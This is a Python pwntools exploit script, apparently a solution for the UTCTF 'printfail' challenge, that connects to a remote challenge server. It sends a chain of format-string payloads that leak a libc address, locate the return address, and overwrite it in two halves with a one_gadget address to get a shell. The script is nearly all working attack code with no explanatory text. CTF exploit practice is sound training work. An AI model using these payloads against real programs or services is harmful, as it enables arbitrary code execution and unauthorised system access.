#!/usr/bin/env python3

from pwn import *

exe = ELF("./printfail_patched")
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])

        gdb.attach(r, gdbscript='''
                   b*run_round+137
                    b*main+123
                    c
                    ''')
    else:
        r = remote("puffer.utctf.live", 4630)

    return r


def main():
    r = conn()
    input()
    r.sendlineafter(b"do-overs.\n", b"%8c%7$n %13$p")
    r.recvuntil(b"0x")
    leak = int(b"0x" + r.recvline(keepends=False), 16)
    libc.address = leak - 147587 
    log.info("leak libc: " + hex(leak))
    log.info("leak base: " + hex(libc.address))

    payload = b"%8c%7$n %8$p"
    r.sendlineafter(b'chance.\n', payload)
    r.recvuntil(b"       8 ")
    leak = int(r.recvline(keepends=False), 16)
    ret = leak + 8
    log.info("ret: " + hex(ret & 0xffff))

    payload = f"%8c%7$n%{ret & 0xffff - 8}c%15$hn".encode()
    r.sendlineafter(b'chance.\n', payload)

    one_gadget = libc.address + 0xe3b04
    part1 = one_gadget & 0xffffff   
    part2 = (one_gadget >> 8*3) & 0xffffff

    log.info("one_gadget 1: " + hex(part1))
    log.info("one_gadget 2: " + hex(part2))

    payload1 = f"%8c%7$n%{part1 - 8}c%43$n".encode()
    r.sendlineafter(b'chance.\n', payload1)

    payload = f"%8c%7$n%{(ret +3) & 0xffff - 8}c%15$hn".encode()
    r.sendlineafter(b'chance.\n', payload)

    payload = f"%{part2}c%43$n".encode()
    r.sendlineafter(b'chance.\n', payload)

    r.interactive()


if __name__ == "__main__":
    main()

    # payload = f"%8c%7$n%{part2 - 8}c%47$n".encode()
    # r.sendlineafter(b'chance.\n', payload)

    # payload = f"%*14$c%47$n".encode()
    # r.sendlineafter(b'chance.\n', payload)
